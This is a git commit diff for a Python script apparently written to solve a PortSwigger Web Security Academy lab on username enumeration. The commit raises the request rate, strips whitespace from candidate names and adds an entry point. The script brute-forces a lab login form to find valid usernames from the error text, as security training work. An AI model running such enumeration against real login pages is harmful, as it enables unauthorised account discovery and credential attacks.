9bbf86b18c1552b2fc1ccfa59ea460ec0045bf04
Michael George <michael.g.george@gmail.com>
2022-11-02 05:10:33 +0530

    Modify user_enum in username_diff_res, script, auth
    Modified user_enum to strip whitespace chars around usernames.

--- portswigger/auth/username_diff_res/script.py
+++ portswigger/auth/username_diff_res/script.py
@@ -3,7 +3,7 @@ from pathlib import Path
 from ratelimit import limits, RateLimitException, sleep_and_retry
 
 ONE_MINUTE = 60
-MAX_CALLS_PER_MINUTE = 30
+MAX_CALLS_PER_MINUTE = 120
 url = 'https://0a5700cb04b21ea8c0da5f02009600ed.web-security-academy.net/login'
 headers = {
     'Content-Type': 'application/x-www-form-urlencoded',
@@ -28,7 +28,7 @@ def user_enum(url, user_file_list, headers, cookies):
     with Path(user_file_list).open('r') as file:
         lines = file.readlines()
         for line in lines:
-            res = make_user_call(url, line, headers, cookies)
+            res = make_user_call(url, line.strip(), headers, cookies)
             if 'Invalid username' not in res.text:
                 return line
 
@@ -44,3 +44,6 @@ def main():
             cookies
         )
     )    
+
+if __name__ == "__main__":
+    main()
